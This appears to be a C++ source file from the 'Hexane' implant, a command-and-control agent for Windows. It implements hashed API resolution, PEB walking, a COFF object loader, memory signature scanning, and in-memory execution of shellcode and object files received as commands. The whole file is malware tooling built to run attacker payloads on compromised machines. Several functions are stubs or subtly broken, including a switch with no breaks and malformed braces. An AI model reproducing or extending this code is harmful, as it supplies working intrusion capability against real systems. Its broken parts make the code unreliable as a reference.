#include <core/include/memory.hpp>

void* operator new(std::size_t size) {
    HEXANE

    void *ptr = nullptr;
    if (Ctx->heap && Ctx->nt.RtlAllocateHeap) {

        ptr = Ctx->nt.RtlAllocateHeap(Ctx->heap, 0, size);
        if (!ptr) {
            NtCurrentTeb()->LastErrorValue = ERROR_NOT_ENOUGH_MEMORY;
        }
    }

    return ptr;
}

void operator delete(void* ptr) noexcept {
    HEXANE

    if (Ctx->heap && Ctx->nt.RtlFreeHeap && ptr) {
        if (!Ctx->nt.RtlFreeHeap(Ctx->heap, 0, ptr)) {
            NtCurrentTeb()->LastErrorValue = ERROR_INVALID_PARAMETER;
        }
    }
}

void* operator new[](std::size_t size) {
    return ::operator new(size);
}

void operator delete[](void* ptr) noexcept {
    ::operator delete(ptr);
}



namespace Memory {
    LPVOID ExceptionReturn = { };

    namespace Methods {

        UINT_PTR GetStackCookie() {
            HEXANE

            uintptr_t cookie = 0;
            if (!NT_SUCCESS(Ctx->nt.NtQueryInformationProcess(NtCurrentProcess(), S_CAST(PROCESSINFOCLASS, 0x24), &cookie, 0x4, nullptr))) {
                cookie = 0;
            }
            return cookie;
        }

        _resource* GetIntResource(HMODULE base, const int rsrc_id) {
            HEXANE

            HRSRC       res_info    = { };
            _resource   *object     = { };

            object = S_CAST(_resource*,  x_malloc(sizeof(_resource)));
            x_assert(res_info          = Ctx->win32.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA));
            x_assert(object->h_global  = Ctx->win32.LoadResource(base, res_info));
            x_assert(object->size      = Ctx->win32.SizeofResource(base, res_info));
            x_assert(object->res_lock  = Ctx->win32.LockResource(object->h_global));

        defer:
            return object;
        }

        _executable* CreateImageData(uint8_t *data) {
            HEXANE

            _executable *image = R_CAST(_executable*, x_malloc(sizeof(_executable)));

            image->buffer   = data;
            image->dos_head = P_IMAGE_DOS_HEADER(image->buffer);
            image->nt_head  = P_IMAGE_NT_HEADERS(image->buffer, image->dos_head);
            image->exports  = P_IMAGE_EXPORT_DIRECTORY(image->dos_head, image->nt_head);

            return image;
        }
    }

    namespace Context {

        VOID ContextInit() {
            // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/

            _hexane instance    = { };
            void    *region     = { };

            instance.teb = NtCurrentTeb();
            instance.heap = instance.teb->ProcessEnvironmentBlock->ProcessHeap;

            instance.teb->LastErrorValue    = ERROR_SUCCESS;
            instance.base.address           = U_PTR(InstStart());
            instance.base.size              = U_PTR(InstEnd()) - instance.base.address;

            x_assert(instance.modules.ntdll = M_PTR(NTDLL));
            x_assert(F_PTR_HMOD(instance.nt.NtProtectVirtualMemory, instance.modules.ntdll, NTPROTECTVIRTUALMEMORY));
            x_assert(F_PTR_HMOD(instance.nt.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP));
            x_assert(F_PTR_HMOD(instance.nt.RtlRandomEx, instance.modules.ntdll, RTLRANDOMEX));

            region = C_PTR(instance.base.address + U_PTR(&__global));
            x_assert(C_DREF(region) = instance.nt.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)));

            x_memcpy(C_DREF(region), &instance, sizeof(_hexane));
            x_memset(&instance, 0, sizeof(_hexane));
            x_memset(C_PTR(U_PTR(region) + sizeof(LPVOID)), 0, 0xE);

        defer:
        }

        VOID ContextDestroy(_hexane* Ctx) {
            // todo: needs expanded to destroy all strings (http/smb context + anything else)

            auto free = Ctx->nt.RtlFreeHeap;
            auto heap = Ctx->heap;

            x_memset(Ctx, 0, sizeof(_hexane));

            if (free) {
                free(heap, 0, Ctx);
            }
        }

    }

    namespace Objects {

        UINT_PTR GetInternalAddress(uint32_t name) {
            HEXANE

            return 1;
        }

        BOOL BaseRelocation(_executable *object) {
            HEXANE

            char        symbol_name[9]  = { };
            char        *entry_name     = { };
            _symbol     *symbol         = { };

            bool        success         = true;
            void        *function       = { };

            uintptr_t   offset          = 0;
            uint32_t    count           = 0;

            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
                object->section     = P_IMAGE_SECTION_HEADER(object->buffer, i);
                object->reloc       = R_CAST(_reloc*, U_PTR(object->buffer) + object->section->PointerToRelocations);

                for (auto j = 0; j < object->section->NumberOfRelocations; j++) {

                    symbol = &object->symbol[object->reloc->SymbolTableIndex];

                    if (symbol->First.Value[0] != 0) {
                        x_memset(symbol_name, 0, sizeof(symbol_name));
                        x_memcpy(symbol_name, symbol->First.Name, 8);

                        entry_name = symbol_name;
                    } else {
                        entry_name = R_CAST(char*, B_PTR(object->symbol) + object->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
                    }

                    void *reloc     = object->sec_map[j].address + object->reloc->VirtualAddress;
                    void *target    = object->sec_map[symbol->SectionNumber - 1].address;
                    void *fn_map    = object->fn_map + sizeof(void*) * count;

                    auto hash = Utils::GetHashFromStringA(entry_name, x_strlen(entry_name));
                    if (!(function = C_PTR(ResolveSymbol(object, hash, symbol->Type)))
)
#ifdef WIN64
                    {
                        if (object->reloc->Type == IMAGE_REL_AMD64_REL32) {
                            *R_CAST(void**, fn_map) = function;

                            offset = S_CAST(uint32_t, U_PTR(fn_map) - U_PTR(reloc) - sizeof(uint32_t));
                            *S_CAST(uintptr_t*, reloc) = offset;

                            count++;

                        } else {
                            success_(false);
                        }
                    } else {
                        if (object->reloc->Type == IMAGE_REL_AMD64_REL32) {
                            offset = *S_CAST(uint32_t*, reloc);
                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t);

                            *S_CAST(uint32_t*, reloc) = offset;
                        } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_1) {
                            offset = *S_CAST(uint32_t*, reloc);
                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 1;

                            *S_CAST(uint32_t*, reloc) = offset;
                        } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_2) {
                            offset = *S_CAST(uint32_t*, reloc);
                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 2;

                            *S_CAST(uint32_t*, reloc) = offset;
                        } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_3) {
                            offset = *S_CAST(uint32_t*, reloc);
                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 3;

                            *S_CAST(uint32_t*, reloc) = offset;
                        } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_4) {
                            offset = *S_CAST(uint32_t*, reloc);
                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(UINT32) - 4;

                            *S_CAST(uint32_t*, reloc) = offset;
                        } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_5) {
                            offset = *S_CAST(uint32_t*, reloc);
                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 5;

                            *S_CAST(uint32_t*, reloc) = offset;
                        } else if (object->reloc->Type == IMAGE_REL_AMD64_ADDR32NB) {
                            offset = *S_CAST(uint32_t*, reloc);
                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t);

                            *S_CAST(uint32_t*, reloc) = offset;
                        } else if (object->reloc->Type == IMAGE_REL_AMD64_ADDR64) {
                            offset = *S_CAST(uint64_t*, reloc);
                            offset += U_PTR(target);

                            *S_CAST(uint64_t*, reloc) = offset;
                        } else {
                            success_(false);
                        }
                    }
#else
                    {
                        if (object->reloc->Type == IMAGE_REL_I386_DIR32) {
                            *S_CAST(void**, fn_map) = function;
                            offset = U_PTR(fn_map);

                            *S_CAST(uint32_t*, reloc) = offset;
                            count++;

                        } else {
                            success_(false);
                        }
                    } else {
                        if (object->reloc->Type == IMAGE_REL_I386_REL32) {
                            offset = *S_CAST(uint32_t*, reloc);
                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t);

                            *S_CAST(uint32_t*, reloc) = offset;
                        }
                        else if (object->reloc->Type == IMAGE_REL_I386_DIR32) {
                            offset = *S_CAST(uint32_t*, reloc);
                            offset += U_PTR(target);

                            *S_CAST(uint32_t*, reloc) = offset;
                        }
                        else {
                            success_(false);
                        }
                    }
#endif
                    object->reloc = R_CAST(_reloc*, (U_PTR(object->reloc)  + sizeof(_reloc)));
                }
            }

            defer:
            return success;
        }

        UINT_PTR ResolveSymbol(_executable *object, const uint32_t entry_name, uint32_t type) {
            // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/CoffeeLdr.c#L87
            HEXANE

            uintptr_t   address     = { };
            char        *lib_name   = { };
            char        *fn_name    = { };

            x_assert(address = Memory::Objects::GetInternalAddress(entry_name));
            address = 1;

                /*
                 * todo: change cmd_map to func_map and add every function
                 * ok, hear me out:
                 *      auto name = "__imp_NTDLL$NtAllocateVirtualMemory" or "__Hexane$OpenUserProcess"
                 *      map[string]string = strings.Split(name, "$")
                 *
                 *      LoadExport(module, function);
                 */

            address = Modules::LoadExport(lib_name, fn_name);

            defer:
            return address;
        }

        SIZE_T GetFunctionMapSize(_executable *object) {
            HEXANE

            _symbol     *symbol         = { };
            char        *symbol_name    = { };

            char        buffer[9]       = { };
            uint32_t    n_funcs         = 0;

            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {

                object->section    = P_IMAGE_SECTION_HEADER(object->buffer, i);
                object->reloc      = R_CAST(_reloc*, object->section->PointerToRelocations);

                for (auto j = 0; j < object->section->NumberOfRelocations; j++) {
                    symbol = &object->symbol[object->reloc->SymbolTableIndex];

                    if (symbol->First.Value[0] != 0) {
                        x_memset(buffer, 0, sizeof(buffer));
                        x_memcpy(buffer, symbol->First.Name, 8);
                        symbol_name = buffer;

                    } else {
                        symbol_name = R_CAST(char*, object->symbol + object->nt_head->FileHeader.NumberOfSymbols);
                    }
                    if (Utils::GetHashFromStringA(symbol_name, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
                        n_funcs++;
                    }

                    object->reloc = object->reloc + sizeof(_reloc);
                }
            }

            return sizeof(void*) * n_funcs;
        }

        BOOL MapSections(_executable *object, const uint8_t *const data) {
            HEXANE

            uint8_t *next = { };

            object->fn_map->size = GetFunctionMapSize(object);
            object->sec_map = R_CAST(_object_map*, x_malloc(sizeof(_object_map)));

            x_assert(object->sec_map);

            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
                object->section = P_IMAGE_SECTION_HEADER(data, i);
                object->size    += object->section->SizeOfRawData;
                object->size    = R_CAST(size_t, PAGE_ALIGN(object->size));
            }

            object->size += object->fn_map->size;

            x_ntassert(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->buffer), NULL, &object->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
            next = object->buffer;

            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
                object->section = P_IMAGE_SECTION_HEADER(object->buffer, i);

                object->sec_map[i].size = object->section->SizeOfRawData;
                object->sec_map[i].address = next;

                next += object->section->SizeOfRawData;
                next = PAGE_ALIGN(next);

                x_memcpy(object->sec_map[i].address, C_PTR(U_PTR(data) + object->section->PointerToRawData), object->section->SizeOfRawData);
            }

            object->fn_map = R_CAST(_object_map*, next);

            defer:
            if (ntstatus != ERROR_SUCCESS) {
                return false;
            }

            return true;
        }
    }

    namespace Modules {

        HMODULE GetModuleAddress(const LDR_DATA_TABLE_ENTRY *data) {
            return R_CAST(HMODULE, data->DllBase);
        }

        LDR_DATA_TABLE_ENTRY* GetModuleEntry(const uint32_t hash) {
            const auto head = R_CAST(PLIST_ENTRY, &(PEB_POINTER)->Ldr->InMemoryOrderModuleList);

            for (auto next = head->Flink; next != head; next = next->Flink) {
                wchar_t lowercase[MAX_PATH] = { };

                const auto mod  = R_CAST(LDR_DATA_TABLE_ENTRY*, B_PTR(next) - sizeof(uint32_t) * 4);
                const auto name = mod->BaseDllName;

                if (hash - Utils::GetHashFromStringW(x_wcsToLower(lowercase, name.Buffer), x_wcslen(name.Buffer)) == 0) {
                    return mod;
                }
            }

            return nullptr;
        }

        FARPROC GetExportAddress(const HMODULE base, const uint32_t hash) {

            FARPROC address             = { };
            char    lowercase[MAX_PATH] = { };

            const auto dos_head = P_IMAGE_DOS_HEADER(base);
            const auto nt_head  = P_IMAGE_NT_HEADERS(base, dos_head);
            const auto exports  = P_IMAGE_EXPORT_DIRECTORY(dos_head, nt_head);

            if (exports->AddressOfNames) {
                const auto ords     = RVA(uint16_t*, base, exports->AddressOfNameOrdinals);
                const auto funcs    = RVA(uint32_t*, base, exports->AddressOfFunctions);
                const auto names    = RVA(uint32_t*, base, exports->AddressOfNames);

                for (auto i = 0; i < exports->NumberOfNames; i++) {
                    const auto name = RVA(char*, base, names[i]);

                    x_memset(lowercase, 0, MAX_PATH);

                    if (hash - Utils::GetHashFromStringA(x_mbsToLower(lowercase, name), x_strlen(name)) == 0) {
                        address = R_CAST(FARPROC, RVA(PULONG, base, funcs[ords[i]]));
                        break;
                    }
                }
            }

            return address;
        }

        UINT_PTR LoadExport(const char* const module_name, const char* const export_name) {
            HEXANE

            uintptr_t   symbol = 0;
            int         reload = 0;

            const auto mod_hash = Utils::GetHashFromStringA(module_name, x_strlen(module_name));
            const auto fn_hash = Utils::GetHashFromStringA(export_name, x_strlen(export_name));

            while (!symbol) {
                if (!(F_PTR_HASHES(symbol, mod_hash, fn_hash))) {
                    if (reload || !Ctx->win32.LoadLibraryA(S_CAST(const char*, module_name))) {
                        goto defer;
                    }
                    reload = 1;
                }
            }

            defer:
            return symbol;
        }
    }

    namespace Scanners {

        UINT_PTR RelocateExport(void* const process, const void* const target, size_t size) {
            HEXANE

            uintptr_t   ret     = 0;
            const auto  address = R_CAST(uintptr_t, target);

            for (ret = (address & 0xFFFFFFFFFFF70000) - 0x70000000; ret < address + 0x70000000; ret += 0x10000) {
                if (!NT_SUCCESS(Ctx->nt.NtAllocateVirtualMemory(process, R_CAST(void **, &ret), 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
                    ret = 0;
                }
            }

            return ret;
        }

        BOOL SigCompare(const uint8_t* data, const char* signature, const char* mask) {
            while (*mask && ++mask, ++data, ++signature) {
                if (*mask == 0x78 && *data != *signature) {
                    return false;
                }
            }
            return (*mask == 0x00);
        }

        UINT_PTR SignatureScan(void* process, const uintptr_t start, const uint32_t size, const char* signature, const char* mask) {
            HEXANE

            size_t      read    = 0;
            uintptr_t   address = 0;

            auto buffer  = R_CAST(uint8_t*, x_malloc(size));
            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, R_CAST(void *, start), buffer, size, &read));

            for (auto i = 0; i < size; i++) {
                if (SigCompare(buffer + i, signature, mask)) {
                    address = start + i;
                    break;
                }
            }

            x_memset(buffer, 0, size);

        defer:
            if (buffer) { x_free(buffer); }
            return address;
        }
    }

    namespace Execute {

        LONG WINAPI Debugger(EXCEPTION_POINTERS *exception) {
            HEXANE

            exception->ContextRecord->IP_REG = U_PTR(ExceptionReturn);
            ntstatus = exception->ExceptionRecord->ExceptionCode;

            return EXCEPTION_CONTINUE_EXECUTION;
        }

        BOOL ExecuteCommand(_parser &parser) {
            HEXANE

            _command    cmd         = { };
            uintptr_t   address     = { };

            const auto  cmd_id      = Parser::UnpackDword(&parser);
            bool        success     = true;

            if (cmd_id == NOJOB) {
                goto defer;
            }

            x_assertb(address = Memory::Objects::GetInternalAddress(cmd_id));

            cmd = R_CAST(_command, Ctx->base.address + address);
            cmd(&parser);

        defer:
            return success;
        }

        BOOL ExecuteShellcode(const _parser& parser) {
            HEXANE

            void    (*exec)()   = { };
            void    *address    = { };

            size_t  size        = parser.Length;
            bool    success     = true;

            x_ntassertb(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), &address, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

            x_memcpy(address, parser.buffer, parser.Length);
            x_ntassertb(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &address, &size, PAGE_EXECUTE_READ, nullptr));

            exec = R_CAST(void(*)(), address);
            exec();

            x_memset(address, 0, size);

        defer:
            if (address) { Ctx->nt.NtFreeVirtualMemory(NtCurrentProcess(), &address, &size, MEM_FREE); }
            return success;
        }

        BOOL ExecuteObject(_executable *object, const char *entrypoint, char *args, uint32_t size, uint32_t req_id) {
            HEXANE

            bool success        = false;
            char *symbol_name   = { };
            void *veh_handler   = { };
            void *exec          = { };

            x_assert(veh_handler = Ctx->nt.RtlAddVectoredExceptionHandler(1, &Memory::Execute::Debugger));

            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
                object->section = P_IMAGE_SECTION_HEADER(object->buffer, i);

                if (object->section->SizeOfRawData > 0) {
                    uint32_t protection = 0;

                    switch (object->section->Characteristics & IMAGE_SCN_MEM_RWX) {
                    case NULL:                  protection = PAGE_NOACCESS;
                    case IMAGE_SCN_MEM_READ:    protection = PAGE_READONLY;
                    case IMAGE_SCN_MEM_RX:      protection = PAGE_EXECUTE_READ;
                    case IMAGE_SCN_MEM_RW:      protection = PAGE_READWRITE;
                    case IMAGE_SCN_MEM_WRITE:   protection = PAGE_WRITECOPY;
                    case IMAGE_SCN_MEM_XCOPY:   protection = PAGE_EXECUTE_WRITECOPY;
                    default:                    protection = PAGE_EXECUTE_READWRITE;
                    }

                    if ((object->section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) == IMAGE_SCN_MEM_NOT_CACHED) {
                        protection |= PAGE_NOCACHE;
                    }

                    x_ntassert(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->sec_map[i].address), &object->sec_map[i].size, protection, nullptr));
                }
            }

            if (object->fn_map->size) {
                x_ntassert(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->fn_map), &object->fn_map->size, PAGE_READONLY, nullptr));
            }

            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSymbols; i++) {
                if (object->symbol[i].First.Value[0] != 0) {
                    symbol_name = object->symbol[i].First.Name;
                } else {
                    symbol_name = R_CAST(char*, object->symbol + object->nt_head->FileHeader.NumberOfSymbols + object->symbol[i].First.Value[1]);
                }
#if _M_IX86
                if (symbol_name[0] == 0x5F) {
                    symbol_name++;
                }
#endif
                if (x_memcmp(symbol_name, entrypoint, x_strlen(entrypoint)) == 0) {
                    x_assert(exec = object->sec_map[object->symbol[i].SectionNumber - 1].address + object->symbol[i].Value);
                }
            }

            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
                if (U_PTR(exec) >= U_PTR(object->sec_map[i].address) && U_PTR(exec) < U_PTR(object->sec_map[i].address) + object->sec_map[i].size) {
                    object->section = P_IMAGE_SECTION_HEADER(object->buffer, i);

                    if ((object->section->Characteristics & IMAGE_SCN_MEM_EXECUTE) == IMAGE_SCN_MEM_EXECUTE) {
                        success = true;
                    }

                    break;
                }
            }

            if (success) {
                const auto entry    = R_CAST(obj_entry, exec);
                ExceptionReturn     = __builtin_extract_return_addr(__builtin_return_address(0));
                entry(args, size);
            }

            defer:
            if (veh_handler) {
                Ctx->nt.RtlRemoveVectoredExceptionHandler(veh_handler);
            }

            return success;
        }
    }
}
